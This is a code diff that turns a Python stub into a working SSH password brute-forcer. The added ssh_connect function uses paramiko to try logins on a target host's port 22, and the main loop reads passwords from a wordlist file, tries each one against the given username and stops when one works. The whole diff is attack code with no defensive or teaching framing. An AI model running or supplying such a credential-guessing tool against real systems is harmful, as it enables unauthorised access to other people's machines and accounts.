@@ -1,5 +1,24 @@
 import paramiko, sys, os, socket, termcolor, argparse
 
+
+def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
+    """Returns response code (int) 0:success, 1:authError, 2:connectionError"""
+    SSH_conn = paramiko.SSHClient()
+    SSH_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try :
+        # port 22 is set default in paramiko, declared explicitly for clarity
+        SSH_conn.connect(hostname=host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+        termcolor.cprint(f'[!] Password: {password} incorrect for user: {username} ','red')
+    except socket.error as e:
+        code = 2
+        termcolor.cprint(e, "red")
+
+    SSH_conn.close()
+    return code
+
+
 def main(arguments):
     host = arguments.target_ip
     username = arguments.username
@@ -11,8 +30,13 @@ def main(arguments):
     else:
         with open(input_file, 'r') as file:
             for line in file.readlines():
-                termcolor.cprint(line.strip("\n"), "yellow")
-
+                password = line.strip("\n")
+                termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
+                response = ssh_connect(username, password, host)
+                if response == 0:
+                    termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green')
+                    # on success break loop, no need to keep trying
+                    break
 
 
 def get_arguments():
@@ -29,9 +53,8 @@ def get_arguments():
         parser.error("[!] Introduce target SSH username")
     elif not options.path:
         parser.error("[!] Introduce path to file")
-    return options
 
-    return parser.parse_args()
+    return options
 
 
 if __name__ == "__main__":
